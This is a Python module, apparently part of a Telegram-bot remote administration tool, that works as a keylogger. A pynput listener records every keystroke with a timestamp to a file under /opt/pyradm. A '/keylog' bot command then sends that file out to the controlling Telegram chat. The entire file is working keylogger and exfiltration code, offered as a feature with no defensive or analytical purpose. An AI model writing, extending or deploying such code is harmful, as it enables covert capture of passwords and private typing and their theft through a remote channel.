import asyncio
import logging
import os
from threading import Thread
from aiogram import Router, types
from aiogram.filters import Command
from pynput import keyboard
from datetime import datetime

# Router for keylogger functionality
router = Router()

# File to store keylogs
KEYLOG_FILE = "/opt/pyradm/keylog.txt"

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

# Global variable to store keylog data temporarily
keylog_data = []


def log_key(key):
    """Callback function to log keystrokes."""
    try:
        # Convert key to string
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str}]"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - {key_str}\n"

        # Append to in-memory list
        keylog_data.append(log_entry)

        # Write to file
        with open(KEYLOG_FILE, "a") as f:
            f.write(log_entry)

        logging.info(f"Key logged: {key_str}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")


def start_keylogger():
    """Start the keylogger in a separate thread."""
    try:
        listener = keyboard.Listener(on_press=log_key)
        listener.start()
        logging.info("Keylogger started successfully")
    except Exception as e:
        logging.error(f"Failed to start keylogger: {e}")


@router.message(Command("keylog"))
async def send_keylog(message: types.Message):
    """Send the keylog file as a document to the Telegram chat."""
    logging.info(f"Received /keylog command from chat {message.chat.id}")
    try:
        if os.path.exists(KEYLOG_FILE):
            logging.info(f"Keylog file exists at {KEYLOG_FILE}, attempting to send")
            with open(KEYLOG_FILE, "rb") as f:
                await message.answer_document(document=types.BufferedInputFile(f.read(), filename="keylog.txt"))
            logging.info(f"Keylog file sent to chat {message.chat.id}")
        else:
            logging.warning(f"Keylog file not found at {KEYLOG_FILE}")
            await message.answer("No keylog file found.")
    except Exception as e:
        logging.error(f"Error sending keylog: {e}")
        await message.answer(f"Error sending keylog: {str(e)}")


def setup_keylogger():
    """Initialize the keylogger when the bot starts."""
    logging.info("Setting up keylogger")
    Thread(target=start_keylogger, daemon=True).start()